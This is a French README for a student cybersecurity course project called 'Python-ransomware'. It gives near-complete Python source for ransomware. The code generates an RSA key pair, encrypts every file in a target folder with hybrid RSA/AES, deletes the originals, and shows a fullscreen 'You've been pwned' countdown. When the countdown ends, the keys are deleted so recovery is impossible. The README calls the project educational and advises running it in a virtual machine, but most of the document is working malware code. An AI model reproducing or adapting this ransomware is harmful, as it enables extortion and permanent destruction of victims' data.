![Logo](https://upload.wikimedia.org/wikipedia/commons/thumb/f/f8/Python_logo_and_wordmark.svg/2560px-Python_logo_and_wordmark.svg.png)

**Python-ransomware** est un projet issu d'un cours d'1,5 jours. Il s'agit d'un rançongiciel qui ne demande pas de rançon, mais qui est tout de même dangereux. 

# Description du projet
## Fonctionnement
- Génération d'une paire de clés privée/publique RSA sur 2048 bits.
- Chiffrement des fichiers situés dans le répertoire cible et suppression des fichiers originaux.
- Décompte d'un timer pendant lequel on peut déchiffrer les données.
- A l'issue du timer, les clés de chiffrement sont supprimées: la récupération est *définitivement* rendue impossible.

## Etat d'avancement du projet

- [x] Chiffrement des fichiers
- [x] Traitement des extensions
- [x] Interface graphique
- [x] Suppression des clés à l'expiration de la rançon
- [ ] Chiffrement récursif du contenu des dossiers
- [ ] Ecriture de données aléatoires sur les secteurs des fichiers originaux pour empêcher la récupération
- [ ] Traitement des fichiers ayant plus d'une extension (```exemple.tar.gz```)
- [ ] Compatibilité arm/arm64 (```pycryptomex```)
- [ ] Vérification du paiement avant déchiffrement (lol)

## Dépendances du projet
Ce programme repose sur les bibliothèques suivantes:

- ```pycryptomex``` pour la gestion des clés

Les autres bibliothèques sont standardes:

- ```tkinter``` pour la création d'une interface graphique

- ```os``` pour les E/S fichiers

# Utilisation
## Prérequis
### Préparation de l'environnement de travail
Il est fortement recommandé d'exécuter ce programme dans une machine virtuelle.

- Création d'un environnement virtuel: ```python -m venv env```

- Activation de cet environnement virtuel: ```./env/Scripts/activate```

- Installation des dépendances: ```python -m pip install -r requirements.txt```


### Modification des variables

Le fichier ```variable.py``` contient:
1) Le nom et/ou chemin des clés privées et publiques (défaut: ```private.pem``` & ```public.pem```)
2) L'extension à rajouter aux fichiers chiffrés (défaut: ```.locked```)
3) Le chemin du répertoire à chiffrer (bien le modifier en respectant le format de l'exemple donné)
4) Le délai d'expiration de la rançon au format ```hh:mm:ss``` (défaut: ```00:00:10```)

## Exécution

Le programme s'exécute simplement en saisissant ```python main.py```. 

# Description des fichiers

## ```main.py```:
Ce fichier contient le programme principal appelant les différentes fonctions. C'est ce fichier qui doit être lancé par l'interpréteur.
```python
def list_full_paths(directory):
    fullPath = [os.path.join(directory, file) for file in os.listdir(directory)]
    return fullPath
    

#Définition de la fonction permettant de chiffrer tous les fichiers du répertoire cible
def encryptFolder():
    for j in list_full_paths(folderToEncrypt):
        encrypt.encrypt(j, publicKey)

#Définition de la fonction permettant de déchiffrer tous les fichiers du répertoire cible
def decryptFolder():
    for k in list_full_paths(folderToEncrypt):
        decrypt.decrypt(k, privateKey)        

#Définition de la fonction permettant de générer un timer
def countdown(count):
    hour,minute,second = count.split(':')
    hour = int(hour)
    minute = int(minute)
    second = int(second)
    label['text'] ='{}:{}:{}'.format(hour, minute, second)
```
> Déclaration des fonctions permettant l'utilisation du programme

```python
if second >= 0 or minute > 0 or hour > 0:
        if second > 0:
            second -= 1
            root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))
        elif minute > 0:
            minute -= 1
            second = 59
            root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
            root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))
        elif second == 0 and minute == 0 and hour == 0: 
            button.destroy()
            os.remove(privateKey)
            os.remove(publicKey)
            buttonQuit.pack()

```
> Logique permettant de générer un compte à rebours. Une fois que le compte à rebours atteint 00:00:00 (dernier ```elif```), on supprime les clés et un bouton permettant de quitter le virus apparaît. Il est alors déjà trop tard.

```python
keygen.generate_pair()    
encryptFolder()

root = tk.Tk()
root.title("You've been pwned !")
root.attributes('-fullscreen', True)
root.resizable(False, False)
label1 = tk.Label(root, text='Vous vous êtes fait pirater !', font=('calibri', 30, 'bold'))
label1.pack()
label2 = tk.Label(root, text='Suppression des clés de chiffrement dans:', font=('calibri', 25, 'bold'))
label2.pack()
label = tk.Label(root,font =('calibri', 40, 'bold'), fg='white',bg='red')
label.pack()
label3 = tk.Label(root, text="Pour déchiffrer vos données, envoyez de l'argent à François Brille et cliquez sur \"Déchiffrer\"", font=('calibri', 13, 'bold'))
label3.pack()
button = tk.Button(root, text ='Déchiffrer', command=lambda : [decryptFolder(),root.quit()])
button.pack()
label4 = tk.Label(root, text='Notes: si ce programme est lancé sur votre machine personnelle, cliquez immédiatement sur Déchiffrer:', font=('calibri', 10, 'bold'))
label4.pack()
buttonQuit = tk.Button(root, text= 'Quitter', command=lambda : [print("Bye, enjoy your forever encrypted files"),root.quit()])

countdown(timer)

root.mainloop()

```
> Les deux premières lignes sont les actions effectuées à l'ouverture du virus: génération d'une paire de clés et chiffrement des fichiers via les fonctions déclarées. L'interface graphique est générée ici. 
> ```countdown(timer)``` permet de lancer le décompte une fois la fenêtre apparue.

## ```variable.py``` :

```python
keySize = 2048
publicKey = "public.pem"
privateKey = "private.pem"
extensionToAppend = ".locked"
folderToEncrypt = 'Z:/Python malware/cible'
timer = ('00:00:10')
```
> Contient les variables du programmes, à modifier avant le premier lançement selon les paramètres souhaités:
>
> - ```keySize```: taille de la clé, en bits
>
> - ```publicKey```: chemin et nom de la clé publique enregistrée par ```keygen.py```
>
> - ```privateKey```: chemin et nom de la clé privée enregistrée par ```keygen.py```
>
> - ```extensionToAppend```: extension à rajouter à la fin des fichiers chiffrés (**ne pas utiliser** **```.lock```** déjà utilisé par certains systèmes Unix)
>
> - ```folderToEncrypt```: chemin du répertoire dont on souhaite chiffrer les fichiers
>
> - ```timer```: décompte avant la suppression de la clé privée, au format ```hh:mm:ss```

## ```keygen.py```: 
```python
key = RSA.generate(keySize)
openedPrivateKey = key.export_key()
openedPublicKey = key.publickey().export_key()
```
> Génère une paire de clés asymétriques sur ```keySize``` bits, puis assigne à une variable la clé privée puis la clé publique.

```python
file = open(publicKey,"wb")
file.write(openedPublicKey)
file.close
file = open(privateKey,"wb")
file.write(openedPrivateKey)
file.close
```
> Sauvegarde successivement la clé publique puis la clé privée dans un fichier nommé ```publicKey``` et ```privateKey```.

## ```encrypt.py```:
```python
filePub = open(publicKey, "rb")
key = RSA.importKey(filePub.read())
fileData = open(fileToEncrypt, "rb")
data = fileData.read()
data = bytes(data)
sessionKey = os.urandom(16)
cipher = PKCS1_OAEP.new(key)
encryptedSessionKey = cipher.encrypt(sessionKey)
cipher = AES.new(sessionKey, AES.MODE_EAX)
ciphertext, tag = cipher.encrypt_and_digest(data)
[ fileName, fileExtension ] = fileToEncrypt.split('.')
encryptedFile = fileName + "." + fileExtension + extensionToAppend
with open(encryptedFile,  'wb') as f:
    [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext)]
print('Encrypted file saved to ' + encryptedFile)
filePub.close()
fileData.close()
#Suppression du/des fichier(s) originaux
os.remove(fileToEncrypt)
```
> Chiffre les données avec la clé publique générée par ```keygen.py``` et supprime les fichiers originaux.

## ```decrypt.py```:
```python
filePriv = open(privateKeyFile, "rb")
key = RSA.importKey(filePriv.read())
filePriv.close()
filePub = open(fileToDecrypt, "rb")
encryptedSessionKey, nonce, tag, ciphertext = [ filePub.read(x) for x in (key.size_in_bytes(), 16, 16, -1) ]
filePub.close()
cipher = PKCS1_OAEP.new(key)
sessionKey = cipher.decrypt(encryptedSessionKey)
cipher = AES.new(sessionKey, AES.MODE_EAX, nonce)
data = cipher.decrypt_and_verify(ciphertext, tag)
[ fileName, fileOriginalExtension, fileExtension ] = fileToDecrypt.split('.')
decryptedFile = fileName + "." + fileOriginalExtension
with open(decryptedFile, 'wb') as f:
    f.write(data)
print('Decrypted file saved to ' + decryptedFile)
#Suppression du/des fichier(s) chiffré(s)
os.remove(fileToDecrypt)
```
> Effectue l'opération inverse à ```encrypt.py``` et déchiffre les données à l'aide de la clé privée générée par ```keygen.py```.


# Crédits
## Auteur

Par François B, étudiant à l'école IPSSI en première année de master Cybersécurité & cloud-computing

Merci à Christian A, enseignant chercheur

## Licence

Ce programme a été créé dans un but purement éducatif et n'est soumis en tant que tel à aucune licence.
Les licences des bibliothèques et interprêteurs utilisés s'appliquent.


